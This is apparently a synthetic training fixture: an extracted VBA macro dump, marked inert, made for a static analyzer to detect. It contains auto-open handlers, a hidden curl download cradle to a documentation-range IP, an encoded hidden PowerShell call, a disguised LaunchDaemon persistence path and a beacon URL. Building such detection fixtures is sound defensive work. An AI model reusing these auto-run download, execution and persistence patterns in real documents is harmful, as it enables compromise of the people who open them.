' ============================================================
'  SYNTHETIC LAB FIXTURE — GraySentinel DSOU Day 2
'  This is EXTRACTED VBA SOURCE (olevba-style dump), NOT a live document.
'  It is INERT: every network target is RFC-5737 / example.com, every
'  payload path is a placeholder. It exists ONLY so the static analyzer
'  has realistic signatures to detect. It cannot download or run anything.
'  Host: mac-victim-07 | Case: GS-DAY2-2026 | Classification: LAB-ONLY
' ============================================================

Attribute VB_Name = "ThisDocument"

Sub AutoOpen()
    Document_Open
End Sub

Sub Document_Open()
    Dim payloadUrl As String
    Dim stager As String
    ' download cradle (SYNTHETIC target)
    payloadUrl = "http://198.51.100.44/assets/update.bin"
    stager = "cHJpbnQoJ1NZTlRIRVRJQyBTVEFHRVIgLSBOTyBQQVlMT0FEJyk="
    ' [olevba deobfuscated] Shell "curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u"
    Shell "osascript -e 'do shell script " & Chr(34) & "curl -s " & payloadUrl & " -o /tmp/.u" & Chr(34) & "'", vbHide
    CreateObject("WScript.Shell").Run "powershell -w hidden -enc " & stager, 0, False
    Call StagePersistence
End Sub

Sub StagePersistence()
    ' macOS LaunchDaemon persistence (SYNTHETIC plist path)
    Dim plist As String
    plist = "/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist"
    Debug.Print "would_write:" & plist
    Debug.Print "would_beacon:http://203.0.113.9:8443/gate"
End Sub
